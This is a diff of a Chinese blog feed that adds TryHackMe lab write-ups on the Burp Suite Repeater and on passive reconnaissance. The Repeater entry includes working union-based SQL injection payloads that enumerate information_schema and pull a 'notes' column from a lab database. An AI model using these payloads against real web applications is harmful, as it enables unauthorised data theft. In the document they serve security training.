@@ -10612,7 +10612,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>3)有效载荷包含一个请求，该请求迫使一个HTTP请求返回黑客的机器，其中包含数据库中的数据。</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/75103b88e95d4eda2244dbb360cba4ff.png" alt="img"></p>
 <h4 id="29-修复sql注入"><a href="#2-9-修复SQL注入" class="headerlink" title="2.9 修复SQL注入"></a>2.9 修复SQL注入</h4><p><strong>修复</strong></p>
-<p>由于SQL注入漏洞的影响，开发人员确实有一种方法来保护他们的web应用程序，通过遵循以下建议:</p>
+<p>由于 SQL 注入漏洞的影响，开发人员确实有一种方法来保护他们的web应用程序，通过遵循以下建议:</p>
 <p><strong>准备语句(带有参数化查询):</strong></p>
 <p>在准备好的查询中，开发人员编写的第一件事是SQL查询，然后将任何用户输入作为参数添加。编写准备好的语句可以确保SQL代码结构不会改变，并且数据库可以区分查询和数据。作为一个好处，它还使您的代码看起来更干净，更容易阅读。</p>
 <p><strong>输入验证:</strong></p>
@@ -12772,6 +12772,467 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 ]]></content>
       <tags>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tryhackme渗透测试BurpSuite:Repeater</title>
+    <url>/2023/02/04/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<h3 id="一-导引"><a href="#一-导引" class="headerlink" title="一. 导引"></a>一. 导引</h3><h4 id="11-outline-大纲"><a href="#1-1-Outline-大纲" class="headerlink" title="1.1 Outline  大纲"></a>1.1 Outline  大纲</h4><p>欢迎来到 Burp：Repeater 房间！</p>
+<p>在介绍了使用 Burp Suite 的基础知识之后，这个房间将深入探讨该框架更强大的方面之一，即：Burp Suite Repeater 模块。<br>我们将介绍如何使用 Repeater 来操纵和任意重新发送捕获的请求，以及查看这个很棒的工具中可用的一些更漂亮的选项。 最后，我们将遇到一系列示例，包括现实世界中的额外练习，我们将使用它来巩固房间的更多理论方面。</p>
+<p>如果您之前没有使用过 Burp Suite 并且没有完成 Burp Basics 房间，您可能希望在继续之前现在就这样做，因为这个房间建立在那里所涵盖的基础之上。</p>
+<blockquote>
+<p>部署机器（如果您不使用自己的攻击 VM，则部署 AttackBox ），让我们开始吧！</p>
+<p>注意：如果您没有使用 AttackBox 并且想在没有 VPN 的情况下连接到这台机器，您可以在机器完全加载并显示 IP 地址后使用此链接：<a href="https://lab_web_url.p.thmlabs.com./">https://LAB_WEB_URL.p.thmlabs.com。</a></p>
+</blockquote>
+<h3 id="二-repeater"><a href="#二-Repeater" class="headerlink" title="二. Repeater"></a>二. Repeater</h3><h4 id="21-什么是-repeater"><a href="#2-1-什么是-Repeater？" class="headerlink" title="2.1 什么是 Repeater？"></a>2.1 什么是 Repeater？</h4><p>在我们开始使用 Repeater 之前，了解它的作用会很有帮助。</p>
+<p>简而言之：Burp Suite Repeater 允许我们随意制作和&#x2F;或将截获的请求中继到目标。 通俗地说，这意味着我们可以获取在 Proxy 中捕获的请求，对其进行编辑，并根据需要多次重复发送相同的请求。 或者，我们可以手动创建请求，就像我们从 CLI（命令行界面）中所做的那样，使用诸如 cURL 之类的工具来构建和发送请求。</p>
+<p>这种多次编辑和重新发送相同请求的能力使 Repeater 非常适合在端点进行任何类型的手动探索，为我们提供了一个漂亮的图形用户界面 (GUI) 来编写请求有效负载和大量视图（包括用于响应的图形视图），以便我们可以看到我们手工操作的结果。</p>
+<p>Repeater 界面可以分为六个主要部分——可以在以下要点下方找到带注释的图表：</p>
+<ul>
+<li>在选项卡的最左上角，我们有一个 Repeater 请求列表。 我们可以有许多不同的请求通过 Repeater：每次我们向 Repeater 发送新请求时，它都会出现在这里。</li>
+<li>在请求列表的正下方，我们有当前请求的控件。 这些允许我们发送请求、取消挂起的请求以及在请求历史记录中前进&#x2F;后退。</li>
+<li>仍然在选项卡的左侧，但占据了大部分窗口，我们有请求和响应视图。 我们在请求视图中编辑请求，然后按发送。 响应将显示在 Response 视图中。</li>
+<li>在请求&#x2F;响应部分的上方，右侧是一组选项，允许我们更改请求和响应视图的布局。 默认情况下，这通常是并排的（水平布局，如屏幕截图所示）； 但是，我们也可以选择将它们放在彼此的上方&#x2F;下方（垂直布局）或放在单独的选项卡中（组合视图）。</li>
+<li>在窗口的右侧，我们有检查器，它允许我们将请求分开，以比使用原始编辑器更直观的方式分析和编辑它们。 我们将在稍后的任务中介绍这一点。</li>
+<li>最后，在 Inspector 上方我们有我们的目标。 很简单，这是我们向其发送请求的 IP 地址或域。 当我们从 Burp Suite 的其他部分向 Repeater 发送请求时，这将被自动填写。</li>
+</ul>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/631e09c2296fbc8d73ed38afa9705a50.png" alt="Annotated diagram of the repeater interface"></p>
+<p>如果现在这还不太有意义，请不要担心——在接下来的任务中，您将有很多机会亲身了解它的作用！</p>
+<h4 id="22-repeater-的基础用法"><a href="#2-2-Repeater-的基础用法" class="headerlink" title="2.2 Repeater 的基础用法"></a>2.2 Repeater 的基础用法</h4><p>我们现在知道界面是什么样子的，但是我们如何使用它呢？</p>
+<p>虽然我们可以手工制作请求，但更常见的做法是简单地在代理中捕获请求，然后将其发送到 Repeater 进行编辑&#x2F;重新发送。</p>
+<p>通过在代理中捕获请求，我们可以通过右键单击请求并选择 “Send to Repeater” 或按 Ctrl + R 来发送到中继器。</p>
+<p>切换回 Repeater，我们可以看到我们的请求现在可用：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/ae762b56b7ecb30a0d861221d41502f5.png" alt="Viewing the captured request in Repeater"></p>
+<p>target 和 Inspector 元素现在也显示信息； 然而，我们还没有得到回应。 当我们点击“发送”按钮时，响应部分会快速填充：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/11da62185a73223355048c2fc04a1340.png" alt="The response field is now populated having sent the request"></p>
+<p>如果我们想更改有关请求的任何内容，我们只需在请求窗口中键入并再次按 “Send” 即可； 这将更新右侧的响应。 例如，将“Connection”标头更改为打开而不是关闭会导致响应“Connection”标头的值为 keep-alive：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/67d1462106edc86bd676315b3c0cba08.png" alt="Changing the Connection header results in a different response, with the server now keeping the connection alive"></p>
+<p>然后我们还可以使用发送按钮右侧的历史按钮在我们的修改历史中前进和后退。</p>
+<h4 id="23-view"><a href="#2-3-View" class="headerlink" title="2.3 View"></a>2.3 View</h4><p>Repeater 为我们提供了多种方式来呈现对我们请求的响应——这些方式从十六进制输出一直到页面的完全渲染版本。</p>
+<p>我们可以通过查看响应框上方来查看可用选项：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/635ad62b0204b104bbd58489716eccde.png" alt="The four view buttons above the response text"></p>
+<p>我们这里有四个显示选项：</p>
+<ul>
+<li>Pretty：这是默认选项。 它采用原始响应并尝试稍微美化它，使其更易于阅读。</li>
+<li>Raw：来自服务器的纯净、未美化的响应。</li>
+<li>Hex：此视图采用原始响应并为我们提供了它的字节视图——如果响应是二进制文件，则特别有用。</li>
+<li>Render：呈现视图呈现页面，就像它在浏览器中显示的那样。 考虑到我们在使用 Repeater 时通常会对源代码感兴趣，因此虽然用处不大，但这仍然是一个巧妙的技巧。</li>
+</ul>
+<p>在大多数情况下，“Pretty”选项就足够了； 但是，仍然值得了解如何使用其他三个选项。</p>
+<p>视图按钮的右侧是 “Show non-printable characters 显示不可打印字符” 按钮 (\n)。 这个按钮允许我们显示通常不会出现在 Pretty 或 Raw 视图中的字符。 例如，响应中的每一行都将以字符 \r\n 结尾————这些字符表示一个回车符后跟一个换行符，并且是 HTTP 标头解释方式的一部分。</p>
+<p>虽然大多数任务不需要，但此选项仍然可以派上用场。</p>
+<h4 id="24-inspector"><a href="#2-4-Inspector" class="headerlink" title="2.4 Inspector"></a>2.4 Inspector</h4><p>在许多方面，Inspector 完全是对 Repeater 窗口的请求和响应字段的补充。 如果您了解如何读取和编辑 HTTP 请求，那么您可能会发现您根本很少使用 Inspector。</p>
+<p>也就是说，这是获得请求和响应的美化分解的极好方法，以及通过实验了解使用更高级别的 Inspector 所做的更改如何影响等效的原始版本。</p>
+<p>Inspector 可以在 Proxy 和 Repeater 中使用。 在这两种情况下，它都出现在窗口的最右侧，并为我们提供了请求和响应中的组件列表：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/c365f42b324b823dfc928c28f3c41214.png" alt="Screenshot showing the available components in Inspector"></p>
+<p>其中，请求部分几乎总是可以更改，允许我们添加、编辑和删除项目。 例如，在 Request Attributes 部分，我们可以编辑请求中处理位置、方法和协议的部分； 例如更改我们要检索的资源，将请求从 GET 更改为另一种 HTTP 方法，或将协议从 HTTP&#x2F;1 切换到 HTTP&#x2F;2：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/4f3a0f3714ceebbd6016e077369b48e8.png" alt="Screenshot showing the layout of the request attributes section."></p>
+<p>可用于查看和&#x2F;或编辑的其他部分是：</p>
+<ul>
+<li><strong>Query Parameters</strong> 查询参数，指的是在 URL 中发送到服务器的数据。 例如，在对 <a href="https://admin.tryhackme.com/?redirect=false">https://admin.tryhackme.com/?redirect=false</a> 的 GET 请求中，有一个名为“redirect”的查询参数，其值为“false”。</li>
+<li><strong>Body Parameters</strong> 正文参数，与查询参数做同样的事情，但用于 POST 请求。 我们在 POST 请求中作为数据发送的任何内容都将显示在此部分中，再次允许我们在重新发送之前修改参数。</li>
+<li>如您所料，<strong>Request Cookies</strong>  请求 Cookie 包含随每个请求一起发送的 cookie 的可修改列表。</li>
+<li><strong>Request Headers</strong> 请求标头允许我们查看、访问和修改（包括完全添加或删除）与我们的请求一起发送的任何标头。 尝试查看 Web 服务器将如何响应意外标头时，编辑这些内容非常有用。</li>
+<li><strong>Response Headers</strong> 向我们显示服务器响应我们的请求发回的标头。 这些无法编辑（因为我们无法控制服务器返回给我们的标头！）。 请注意，此部分只会在我们发送请求并收到响应后显示。</li>
+</ul>
+<p>这些组件都可以在请求和响应部分中以文本形式找到； 但是，很高兴以 Inspector 提供的表格格式查看它们。 在 Inspector 中添加、删除和编辑标头是非常值得的，以便在您这样做时感受原始版本的变化。</p>
+<h3 id="三-practical-实操"><a href="#三-Practical-实操" class="headerlink" title="三. Practical 实操"></a>三. Practical 实操</h3><h4 id="31-示例"><a href="#3-1-示例" class="headerlink" title="3.1 示例"></a>3.1 示例</h4><p>Repeater 最适合我们需要多次发送相同请求的任务，通常在请求之间有微小的变化。 例如，我们可能希望手动测试 SQL 注入漏洞（我们将在即将执行的任务中执行此操作），尝试绕过 Web 应用程序防火墙过滤器，或者只是在表单提交中添加或更改参数。</p>
+<p>现在，让我们从一个极其简单的示例开始：使用 Repeater 更改我们发送到目标的请求的标头。</p>
+<p>使用 Inspector（或手动，如果您愿意），添加一个名为 FlagAuthorised 的标头并将其设置为值为 True。 例如。：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.203.121<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">FlagAuthorised</span><span class="hljs-punctuation">: </span>True<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="32-挑战"><a href="#3-2-挑战" class="headerlink" title="3.2 挑战"></a>3.2 挑战</h4><p>在之前的任务中，我们使用 Repeater 添加了一个 header 并发送了一个请求； 这应该作为使用 Repeater 的示例——现在是时候进行一个非常简单的挑战了！</p>
+<p>在代理停用后，转到 <a href="http://10.10.203.121/products/">http://10.10.203.121/products/</a> 并尝试单击一些 “See More” 链接。</p>
+<p>当您单击以获取更多详细信息时，您是否注意到它会将您重定向到数字端点（例如 &#x2F;products&#x2F;3）？</p>
+<p>需要验证此端点以确保您尝试导航到的号码存在并且是一个有效的整数； 但是，如果没有得到充分验证会怎样？</p>
+<p><strong>回答以下问题:</strong></p>
+<ol>
+<li>捕获对 Proxy 中数字产品端点之一的请求，然后将其转发给 Repeater。</li>
+<li>通过将请求末尾的数字更改为极端输入，看看是否可以让服务器出现“500 Internal Server Error”代码错误。当您在端点中导致 500 错误时，您收到的标志是什么？</li>
+</ol>
+<h3 id="四-extra-mile-sqli-with-repeater"><a href="#四-Extra-Mile-SQLi-with-Repeater" class="headerlink" title="四. Extra Mile SQLi with Repeater"></a>四. Extra Mile SQLi with Repeater</h3><p>此任务包含一个额外的英里挑战，这意味着它是 Burp Repeater 的一个稍微困难的实际应用程序。 如果您觉得自己执行手动 SQL 注入很舒服，您可以跳到最后一个问题并将其作为盲目挑战来尝试； 否则将在下面给出指南。</p>
+<p>在我们开始这个挑战之前：如果您还不知道 SQLi 的原理，那么花时间查看有关该主题的房间是非常值得的； 但是，将提供完整的步骤，因此您无需深入了解 SQL 注入背后的原理即可完成此任务。</p>
+<p>简述如下：</p>
+<p>&#x2F;about&#x2F;ID 端点的 ID 参数中存在联合 SQL 注入漏洞。 找到此漏洞并执行攻击以检索存储在数据库中的有关 CEO 的注释。</p>
+<p><strong>回答以下问题:</strong></p>
+<p>我们知道存在漏洞，我们知道它在哪里。 现在我们只需要利用它！</p>
+<p>让我们首先在 Burp 代理中捕获对 <a href="http://10.10.203.121/about/2">http://10.10.203.121/about/2</a> 的请求。 捕获请求后，使用 Ctrl + R 或右键单击并选择 “Send to Repeater” 将其发送到中继器。</p>
+<p>现在我们已经准备好请求，让我们确认是否存在漏洞。 添加单个撇号 (‘) 通常足以在存在简单 SQLi 时导致服务器出错，因此，使用 Inspector 或通过手动编辑请求路径，在路径末尾的“2”之后添加一个撇号 并发送请求：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">GET</span> /about/<span class="hljs-number">2</span>&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.203.121</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">80</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">80</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>您应该看到服务器响应“500 Internal Server Error”，表明我们成功中断了查询：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">500</span> INTERNAL SERVER ERROR&lt;<br><span class="hljs-attribute">Server</span>: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span> (Ubuntu)<br><span class="hljs-attribute">Date</span>: Mon, <span class="hljs-number">16</span> Aug <span class="hljs-number">2021</span> <span class="hljs-number">23</span>:<span class="hljs-number">05</span>:<span class="hljs-number">21</span> GMT<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">3101</span><br><br></code></pre></td></tr></table></figure>
+
+<p>如果我们查看服务器响应的主体，我们会在第 40 行左右看到一些非常有趣的东西。服务器告诉我们我们尝试执行的查询：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;h2&gt;</span><br>    <span class="hljs-section">&lt;code&gt;</span><span class="hljs-attribute">Invalid</span> statement: <br>        <span class="hljs-section">&lt;code&gt;</span><span class="hljs-attribute">SELECT</span> firstName, lastName, pfpLink, role, bio FROM people WHERE id = <span class="hljs-number">2</span>&#x27;&lt;/code&gt;<br>    <span class="hljs-section">&lt;/code&gt;</span><br><span class="hljs-section">&lt;/h2&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这是一个非常有用的错误消息，服务器绝对不应该向我们发送它，但我们拥有它这一事实使我们的工作变得更加直接。</p>
+<p>该消息告诉我们一些在利用此漏洞时非常宝贵的事情：</p>
+<p>我们从中选择的数据库表称为 people。<br>查询从表中选择五列：firstName、lastName、pfpLink、role 和 bio。 我们可以猜测这些适合页面的位置，这将有助于我们选择放置响应的位置。<br>有了这些信息，我们就可以跳过查询列号和表名枚举的步骤了。</p>
+<p>虽然我们已经设法删除了此处所需的大量枚举，但我们仍然需要找到我们的目标列的名称。</p>
+<p>由于我们知道表名和行数，我们可以使用联合查询从 information_schema 默认数据库中的列表中为 people 表选择列名。</p>
+<p>一个简单的查询如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">/about/<span class="hljs-number">0</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">table_name</span>=&quot;people&quot;<br></code></pre></td></tr></table></figure>
+
+<p>这将创建一个联合查询并选择我们的目标，然后选择四个空列（以避免查询出错）。 请注意，我们还将选择的 ID 从 2 更改为 0。通过将 ID 设置为无效数字，我们确保不会使用原始（合法）查询检索任何内容； 这意味着从数据库返回的第一行将是我们期望的来自注入查询的响应。</p>
+<p>查看返回的响应，我们可以看到第一列名称（id）已经插入到页面标题中：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.18.0 (Ubuntu)<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 16 Aug 2021 22:12:36 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Front-End-Https</span><span class="hljs-punctuation">: </span>on<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3360<br><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">en</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">            About | id None</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">-----</span><br></code></pre></td></tr></table></figure>
+
+<p>我们已经成功地从数据库中提取了第一个列名，但是我们现在遇到了一个问题。 该页面仅显示第一个匹配项——我们需要查看所有匹配项。</p>
+<p>幸运的是，我们可以使用 SQLi 对结果进行分组。 我们仍然一次只能检索一个结果，但是通过使用 group_concat() 函数，我们可以将所有列名合并为一个输出：</p>
+<blockquote>
+<p>&#x2F;about&#x2F;0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name&#x3D;”people”</p>
+</blockquote>
+<p>这个过程如下图所示：</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/94629aaae1f0.png" alt="img"></p>
+<p>我们已经成功识别了该表中的八列：id、firstName、lastName、pfpLink、role、shortRole、bio 和 notes。</p>
+<p>考虑到我们的任务，我们的目标列是 notes 似乎是一个安全的赌注。</p>
+<p>最后，我们准备好从这个数据库中获取标志——我们拥有我们需要的所有信息：</p>
+<p>表名：people。<br>目标列的名称：notes。<br>CEO 的 ID 为 1 ； 这可以通过单击 &#x2F;about&#x2F; 页面上的 Jameson Wolfe 的个人资料并检查 URL 中的 ID 来找到。</p>
+<p>让我们设计一个查询来提取这个 FLAG：</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>嘿，转眼间，我们有一面旗帜！</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95BurpSuite-Repeater/1ec697198c99.png" alt="Obtaining the flag from the database"></p>
+<p>利用站点中的 union SQL 注入漏洞。</p>
+<p>FLAG 是什么？</p>
+<h3 id="五-结论"><a href="#五-结论" class="headerlink" title="五. 结论"></a>五. 结论</h3><p>我们现在已经完成了 Burp Suite Repeater 房间。</p>
+<p>希望您现在应该了解如何使用 Repeater 来编辑、操作和重新发送请求，并了解这方面的（许多）实际应用程序。</p>
+<p>本模块的下一个房间将继续介绍 Burp Suite Intruder 工具。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tryhackme渗透测试-NetWorkSecurity-PassiveReconnaissance</title>
+    <url>/2023/02/04/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>又绕过了很多收费的房间，我预感到tryhackme的旅程或许要提前结束了。</p>
+<span id="more"></span>
+
+<h3 id="一-passive-reconnaissance-被动侦察"><a href="#一-Passive-Reconnaissance-被动侦察" class="headerlink" title="一. Passive Reconnaissance-被动侦察"></a>一. Passive Reconnaissance-被动侦察</h3><p>了解用于被动侦察的基本工具，例如 whois、nslookup 和 dig。</p>
+<h4 id="11-导引"><a href="#1-1-导引" class="headerlink" title="1.1 导引"></a>1.1 导引</h4><p>欢迎来到网络安全模块的第一个房间。 本模块涵盖：</p>
+<ul>
+<li><p>被动侦察</p>
+</li>
+<li><p>主动侦察</p>
+</li>
+<li><p>Nmap Live 主机发现</p>
+</li>
+<li><p>Nmap 基本端口扫描</p>
+</li>
+<li><p>Nmap 高级端口扫描</p>
+</li>
+<li><p>Nmap 后端口扫描</p>
+</li>
+<li><p>协议和服务器</p>
+</li>
+<li><p>协议和服务器 2</p>
+</li>
+<li><p>网络安全挑战</p>
+</li>
+<li><p>在这个房间里，在我们定义了被动侦察和主动侦察之后，我们将重点介绍与被动侦察相关的基本工具。 我们将学习三个命令行工具：</p>
+</li>
+<li><p>whois 查询 WHOIS 服务器</p>
+</li>
+<li><p>nslookup 查询 DNS 服务器</p>
+</li>
+<li><p>dig 查询 DNS 服务器</p>
+</li>
+<li><p>我们使用 whois 来查询 WHOIS 记录，而我们使用 nslookup 和 dig 来查询 DNS 数据库记录。 这些都是公开可用的记录，因此不会提醒目标。</p>
+</li>
+</ul>
+<p>我们还将学习两种在线服务的用法：</p>
+<ul>
+<li>DNSDumpster</li>
+<li>Shodan.io</li>
+</ul>
+<p>这两个在线服务使我们能够在不直接连接到目标的情况下收集有关目标的信息。</p>
+<p>先决条件：这个房间需要基本的网络知识以及对命令行的基本熟悉。 如有必要，网络基础和 Linux 基础模块提供了所需的知识。</p>
+<p>重要提示：请注意，如果您未订阅，AttackBox 将无法访问互联网，因此您需要使用 VPN 来完成需要访问互联网的问题。</p>
+<p><strong>回答以下问题：</strong></p>
+<p>这个房间不使用目标虚拟机 (VM) 来演示所讨论的主题。 相反，我们将查询公共 WHOIS 服务器和 DNS 服务器以查找 TryHackMe 拥有的域。 启动 AttackBox 并确保它已准备就绪。 您将使用 AttackBox 来回答后面任务中的问题，尤其是任务 3 和 4。</p>
+<h4 id="12-passive-versus-active-recon-被动侦查与主动侦查"><a href="#1-2-Passive-Versus-Active-Recon-被动侦查与主动侦查" class="headerlink" title="1.2 Passive Versus Active Recon 被动侦查与主动侦查"></a>1.2 Passive Versus Active Recon 被动侦查与主动侦查</h4><p>这个房间希望用户具备计算机网络的应用知识。 如果您想温习一下这个主题，我们鼓励您先学习网络基础模块。</p>
+<p>在计算机系统和网络出现之前，孙子兵法在孙子兵法中教导说：“知己知彼，必胜不疑。” 如果您扮演攻击者的角色，则需要收集有关目标系统的信息。 如果你扮演防御者的角色，你需要知道你的对手会发现你的系统和网络的什么。</p>
+<p>侦察（recon）可以定义为收集有关目标信息的初步调查。 这是统一杀伤链在系统上获得初步立足点的第一步。 我们将侦察分为：</p>
+<ol>
+<li>Passive Reconnaissance 被动侦察</li>
+<li>Active Reconnaissance 主动侦察</li>
+</ol>
+<p>在被动侦察中，您依赖于公开可用的知识。 您无需直接与目标接触即可从公开可用资源中获取这些知识。 把它想象成你从远处看着目标领土，而不是踏上那个领土。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/dbda3c79cc81408315a218749030256a.png" alt="img"></p>
+<p>被动侦察活动包括许多活动，例如：</p>
+<ul>
+<li>从公共 DNS 服务器查找域的 DNS 记录。</li>
+<li>检查与目标网站相关的招聘广告。</li>
+<li>阅读有关目标公司的新闻文章。</li>
+</ul>
+<p>另一方面，主动侦察无法如此谨慎地实现。 它需要与目标直接接触。 把它想象成你检查门窗上的锁，以及其他潜在的入口点。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/cddef8bc0ee2d177a96ea62f680ad28f.png" alt="img"></p>
+<p>主动侦察活动的例子包括：</p>
+<ul>
+<li>连接到公司服务器之一，例如 HTTP、FTP 和 SMTP。</li>
+<li>致电公司试图获取信息（社会工程学）。</li>
+<li>冒充修理工进入公司场所。</li>
+<li>考虑到主动侦察的侵入性，除非获得适当的法律授权，否则很快就会陷入法律困境。</li>
+</ul>
+<p><strong>回答以下问题：</strong></p>
+<ol>
+<li>您访问目标公司的 Facebook 页面，希望获得他们的一些员工姓名。 这是什么侦察活动？ （A为主动，P为被动）</li>
+</ol>
+<p>答：被动P</p>
+<ol start="2">
+<li>您 ping 公司网络服务器的 IP 地址以检查 ICMP 流量是否被阻止。 这是什么侦察活动？ （A为主动，P为被动）</li>
+</ol>
+<p>答：主动A</p>
+<ol start="3">
+<li>你在一次聚会上碰巧遇到了目标公司的 IT 管理员。 您尝试使用社会工程学来获取有关他们的系统和网络基础设施的更多信息。 这是什么侦察活动？ （A为主动，P为被动）</li>
+</ol>
+<p>答：主动A</p>
+<h4 id="13-whois"><a href="#1-3-Whois" class="headerlink" title="1.3 Whois"></a>1.3 Whois</h4><p>WHOIS 是遵循 RFC 3912 规范的请求和响应协议。 WHOIS 服务器在 TCP 端口 43 上侦听传入请求。 域名注册商负责维护其租用域名的 WHOIS 记录。 WHOIS 服务器回复与所请求域相关的各种信息。 特别感兴趣的是，我们可以学习：</p>
+<ul>
+<li>注册商：域名是通过哪个注册商注册的？</li>
+<li>注册人联系方式：姓名、单位、地址、电话等。 （除非通过隐私服务隐藏）</li>
+<li>创建、更新和到期日期：域名首次注册的时间是什么时候？ 最后一次更新是什么时候？ 什么时候需要更新？</li>
+<li>名称服务器：请求哪个服务器来解析域名？</li>
+</ul>
+<p>要获取此信息，我们需要使用 whois 客户端或在线服务。 许多在线服务提供 whois 信息； 但是，使用本地 whois 客户端通常更快、更方便。 使用 AttackBox（或您本地的 Linux 机器，例如 Parrot 或 Kali），您可以轻松地在终端上访问您的 whois 客户端。 语法是 whois DOMAIN_NAME，其中 DOMAIN_NAME 是您试图获取更多信息的域。 考虑以下执行 whois tryhackme.com 的示例。</p>
